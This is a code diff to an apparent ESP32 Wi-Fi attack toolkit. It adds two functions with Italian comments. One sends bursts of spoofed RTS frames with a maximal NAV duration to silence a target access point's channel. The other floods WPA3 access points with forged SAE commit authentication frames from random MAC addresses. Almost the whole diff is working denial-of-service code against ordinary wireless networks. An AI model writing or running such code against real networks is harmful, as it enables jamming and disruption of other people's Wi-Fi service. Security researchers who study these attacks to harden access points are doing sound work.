@@ -6,6 +6,7 @@
 #include <freertos/timers.h>
 #include <esp_random.h>
 #include <lwip/inet.h>
+#include <rom/ets_sys.h>
 #include "wifi_attacks.h"
 #include "libwifi.h"
 
@@ -660,4 +661,86 @@ void wifi_attack_send_karma_probe_response(const uint8_t *victim_mac, const char
     }
 
     libwifi_free_probe_resp(&probe_resp_logic);
+}
+
+
+void wifi_attack_nav_abuse(const uint8_t bssid[6])
+{
+    if (bssid == NULL) return;
+
+    // Frame RTS (Request to Send) - Type Control (0x1), Subtype RTS (0xB) -> 0xB4
+    // Duration: 32767 microsecondi (0x7FFF) - Il massimo valore per bloccare il canale
+    uint8_t rts_packet[20] = {
+        0xB4, 0x00,                         // Frame Control (RTS)
+        0xFF, 0x7F,                         // Duration (High value ~32ms)
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver Address (Broadcast o Target)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Transmitter Address (Spoofed BSSID)
+        // No Sequence control in Control Frames usually, but ESP32 API handles padding
+    };
+
+    memcpy(&rts_packet[4], bssid, 6);   // Receiver: Target AP (lo costringiamo a leggere)
+    memcpy(&rts_packet[10], bssid, 6);  // Transmitter: Target AP (sembra che sia LUI a chiedere silenzio)
+
+    // Invia burst di pacchetti
+    for(int i=0; i<5; i++) {
+        esp_wifi_80211_tx(WIFI_IF_STA, rts_packet, 16, false); // Length 16 per RTS
+        ets_delay_us(500); // Piccolo delay per non saturare il TX buffer
+    }
+}
+
+
+void wifi_attack_wpa3_sae_flood(const uint8_t bssid[6])
+{
+    if (bssid == NULL) return;
+
+    uint8_t sae_commit_packet[128]; 
+    uint8_t rand_mac[6];
+    esp_fill_random(rand_mac, 6);
+    rand_mac[0] &= 0xFE; rand_mac[0] |= 0x02; // Unicast locale random
+
+    // 1. Header 802.11 Authentication
+    uint8_t header[] = {
+        0xB0, 0x00,                         // FC: Auth
+        0x3A, 0x01,                         // Duration
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Dest (BSSID)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Random)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+        0x00, 0x00                          // Seq
+    };
+
+    // 2. Auth Body: SAE (Algo=3), Seq=1 (Commit), Status=0
+    uint8_t auth_body[] = {
+        0x03, 0x00, // Auth Algorithm: SAE
+        0x01, 0x00, // Auth Sequence: 1 (Commit)
+        0x00, 0x00  // Status Code: Success
+    };
+
+    // 3. SAE Data (Semplificato per flood)
+    // Group ID 19 (NIST P-256) è standard per WPA3
+    // Scalar e Element dovrebbero essere punti validi sulla curva. 
+    // Per un DoS flood, spesso basta inviare dati random di lunghezza corretta; 
+    // l'AP sprecherà cicli CPU per scoprire che sono invalidi.
+    uint8_t sae_data[64]; // Scalar (32) + Element (32) approssimativo
+    esp_fill_random(sae_data, sizeof(sae_data));
+    uint8_t group_id[] = {0x13, 0x00}; // Group 19 (Little Endian)
+
+    // Costruzione pacchetto
+    int offset = 0;
+    memcpy(sae_commit_packet, header, sizeof(header));
+    memcpy(&sae_commit_packet[4], bssid, 6);     // Dest
+    memcpy(&sae_commit_packet[10], rand_mac, 6); // Src
+    memcpy(&sae_commit_packet[16], bssid, 6);     // BSSID
+    offset += sizeof(header);
+
+    memcpy(&sae_commit_packet[offset], auth_body, sizeof(auth_body));
+    offset += sizeof(auth_body);
+
+    memcpy(&sae_commit_packet[offset], group_id, 2);
+    offset += 2;
+
+    memcpy(&sae_commit_packet[offset], sae_data, sizeof(sae_data));
+    offset += sizeof(sae_data);
+
+    // Invio
+    esp_wifi_80211_tx(WIFI_IF_STA, sae_commit_packet, offset, false);
 }
